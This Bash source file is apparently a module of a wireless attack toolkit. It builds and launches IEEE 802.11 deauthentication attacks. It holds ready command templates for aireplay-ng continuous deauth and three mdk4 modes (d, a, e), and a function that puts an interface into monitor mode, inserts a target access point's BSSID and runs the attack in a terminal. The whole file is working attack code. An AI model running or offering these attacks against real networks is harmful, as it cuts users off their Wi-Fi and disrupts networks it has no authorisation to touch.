#!/usr/bin/env bash

# Copyright 2022 Faither

# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights to
# use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of
# the Software, and to permit persons to whom the Software is furnished to do so,
# subject to the following conditions:

# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.

# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS
# FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
# COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER
# IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
# CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

############################################################
# Initials                                                 #
############################################################

#############
# Constants #
#############

declare -r _Lib_attacks=1;
declare -r _Attack_sourceFilepath="$( readlink -e -- "${BASH_SOURCE[0]:-$0}" 2> '/dev/null'; )";
declare -r _Attack_sourceDirpath="$( dirname -- "$_Attack_sourceFilepath" 2> '/dev/null'; )";

[[ ! -f "$_Attack_sourceFilepath" || ! -d "$_Attack_sourceDirpath" ]] && exit 199;

declare -rA deauthAttackCommands=(
	[0]=$'aireplay-ng \'%s\' --deauth 0 -a \'%s\' --ignore-negative-one'
	[1]=$'mdk4 \'%s\' d -B \'%s\''
	[2]=$'mdk4 \'%s\' a -a \'%s\''
	[3]=$'mdk4 \'%s\' e -t \'%s\''
)

declare -rA deauthAttackDescription=(
	[0]='aireplay-ng --deauth 0'
	[1]='mdk4 d'
	[2]='mdk4 a'
	[3]='mdk4 e'
)

############################################################
# Functions                                                #
############################################################

Attacks_previewAPDetails()
{
	declare markChar=$'\'';

	if [[ "$1" == '-c' ]];
	then
		markChar="$2";
		shift 2;
	fi

	declare __apBssid="$1";
	declare __apChannel="$2";
	declare __apSsid="$3";

	printf "[ B ${markChar}%s${markChar}, C ${markChar}%s${markChar}, S ${markChar}%s${markChar} ]" \
		"$( [[ "$__apBssid" != '' ]] && printf '%s' "$__apBssid"; )" \
		"$( [[ "$__apChannel" != '' ]] && printf '%s' "$__apChannel"; )" \
		"$( [[ "$__apSsid" != '' ]] && printf '%s' "$__apSsid"; )";
}

############################################################
# Methods                                                  #
############################################################

Attacks_IEEE80211Deauth()
{
	###########
	# Options #
	###########

	declare args;

	if ! Options args \
		'?!-d;?!-t;?-a;?-c;?-s;?--bm;?-x;-v' \
		"$@";
	then
		Misc_PrintF -v 1 -t 'f' -nf $'[Attacks_IEEE80211Deauth] Invalid options (code %s, index %s ~ \'%s\'): \'%s\'' -- \
			"$_Options_ResultCode" \
			"$_Options_FailIndex" \
			"$_Options_ErrorMessage" \
			"$( Misc_ArrayJoin -- "$@" )";

		exit 200;
	fi

	declare __device="${args[0]}";
	declare __deauthType="${args[1]}";
	declare __apBssid="${args[2]}";
	declare __apChannel="${args[3]}";
	declare __apSsid="${args[4]}";
	declare __processBindMeta="${args[5]}";
	declare __windowParameters="${args[6]}";
	declare __verbose="${args[7]}";

	########
	# Main #
	########

	if [[ "$__processBindMeta" != '' ]] && ! Environment_ProcessBindTerminate --bm "$__processBindMeta";
	then
		[[ "$__verbose" != 0 ]] && Misc_PrintF -v 2 -t 'e' \
			-nmf $'Failed to start deauthentication attack (type %s) %s. Could not terminate related child process: "{{@clRed}}%s{{@clDefault}}"' -- \
			"$__deauthType" "$( Attacks_previewAPDetails "$__apBssid" "$__apChannel" "$__apSsid" )" "$__processBindMeta";

		return 1;
	fi

	# Interface

	declare Attacks_IEEE80211Deauth_interface;

	if ! Interface_ModeSet -im 1 -- "$__device" || ! Interface_FromDevice -o Attacks_IEEE80211Deauth_interface -d "$__device";
	then
		[[ "$__verbose" != 0 ]] && Misc_PrintF -v 2 -t 'e' \
			-nmf $'Failed to start deauthentication attack (type %s) %s. Failed to prepared interface of "{{@clRed}}%s{{@clDefault}}"' -- \
			"$__deauthType" "$( Attacks_previewAPDetails "$__apBssid" "$__apChannel" "$__apSsid" )" "$__device";

		return 1;
	fi

	declare interface="$Attacks_IEEE80211Deauth_interface";

	# Start

	if
		[ "${deauthAttackCommands[$__deauthType]+s}" = '' ] ||
		[ "${deauthAttackCommands[$__deauthType]}" = '' ]
	then
		[[ "$__verbose" != 0 ]] && Misc_PrintF -v 1 -t 'f' -nf $'No such deauthentication attack type: %s' -- "$__deauthType";

		return 2;
	fi

	declare commandFormat="${deauthAttackCommands[$__deauthType]}";
	declare attackDescription="${deauthAttackDescription[$__deauthType]}";

	# declare command="aireplay-ng '${interface}' --deauth 0 -a '${apBssid}' --ignore-negative-one";
	# declare command="mdk4 '${interface}' d -B '${apBssid}'";
	# declare command="mdk4 '${interface}' a -a '${apBssid}'";
	# declare command="mdk4 '${interface}' e -t '${apBssid}'";
	declare command='';

	case "$__deauthType"
	in
		0|1|2|3)
			declare command="$( printf "$commandFormat" "$interface" "$__apBssid" )";
		;;
	esac

	[[ "$__verbose" != 0 ]] && Misc_PrintF -v 4 -t 'i' -nf $'Starting a deauthentication attack (%s) %s' -- \
		"${__deauthType} ~ \"${attackDescription}\"" "$( Attacks_previewAPDetails "$__apBssid" "$__apChannel" "$__apSsid" )";

	Environment_TerminalStart --bm "$__processBindMeta" -x "$__windowParameters" \
		-Tt "DA attack on '${interface}' (${__deauthType} ~ '${attackDescription}')" -- "$command";

	declare returnCodeTemp=$?;

	if [[ "$returnCodeTemp" != 0 ]];
	then
		[[ "$__verbose" != 0 ]] && Misc_PrintF -v 2 -t 'e' -nf $'Failed to start a deauthentication attack (type %s, code %s) %s' -- \
			"$__deauthType" "$returnCodeTemp" "$( Attacks_previewAPDetails "$__apBssid" "$__apChannel" "$__apSsid" )";

		return "$returnCodeTemp";
	fi
}